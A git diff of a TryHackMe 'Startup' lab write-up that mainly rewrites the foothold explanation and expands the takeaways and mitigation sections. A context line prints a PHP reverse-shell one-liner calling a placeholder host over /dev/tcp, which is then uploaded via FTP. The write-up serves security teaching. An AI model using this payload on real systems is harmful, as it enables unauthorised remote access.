@@ -1,4 +1,6 @@
-# 🔥 Startup - TryHackMe Writeup
+# 🔥 TryHackMe - Startup | Linux Penetration Testing
+
+---
 
 ![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
@@ -122,7 +124,7 @@ To gain initial access, a PHP reverse shell was created:
 echo '<?php system("bash -c '\''bash -i >& /dev/tcp/TU_IP/4444 0>&1'\''"); ?>' > shell.php
 ```
 
-I uploaded a malicious PHP reverse shell by bypassing file validation controls, successfully achieving remote code execution on the target system.
+I uploaded a PHP reverse shell to the writable FTP directory, which was also exposed through the web server. Since PHP files were executed by the web server, accessing the uploaded file resulted in remote code execution.
 
 ```bash
 put shell.php
@@ -282,7 +284,20 @@ This lab highlights the importance of:
 
 Overall, it provides a clear example of how attackers combine enumeration, exploitation, and privilege escalation techniques to compromise a system.
 
+
 ---
+
+
+## 🧠 Key Takeaways
+
+- Writable file-sharing services can become an initial access vector when their contents are also exposed through a web server.
+- Packet captures may contain sensitive information, including credentials transmitted over unencrypted channels.
+- Post-exploitation enumeration can reveal valuable artifacts that are not directly related to the initial foothold.
+- Writable scripts executed in a privileged context can lead to full system compromise.
+
+
+---
+
 
 ## ⚠️ Impact
 
@@ -295,11 +310,16 @@ Overall, it provides a clear example of how attackers combine enumeration, explo
 
 ## 🛡️ Mitigation
 
-- Disable anonymous FTP access and restrict file upload permissions
-- Ensure uploaded files are not publicly accessible or executable via the web server
-- Use encryption (e.g., SSH, HTTPS) to protect sensitive data in transit
-- Apply the principle of least privilege to system users and scripts
-- Regularly audit and secure scripts executed with elevated privileges
+Several security measures could reduce the risk demonstrated in this machine:
+
+- Disable anonymous FTP access unless strictly required.
+- Prevent unauthenticated users from writing files to directories exposed by a web server.
+- Restrict execution of uploaded or user-controlled files.
+- Avoid transmitting credentials over unencrypted protocols.
+- Remove sensitive packet captures and diagnostic files from accessible locations.
+- Apply the principle of least privilege to service and user accounts.
+- Prevent unprivileged users from modifying scripts executed in a privileged context.
+- Monitor file permissions and privileged scheduled tasks for unauthorized changes.
 
 
 > 🔒 This lab highlights how small misconfigurations can lead to full system compromise.
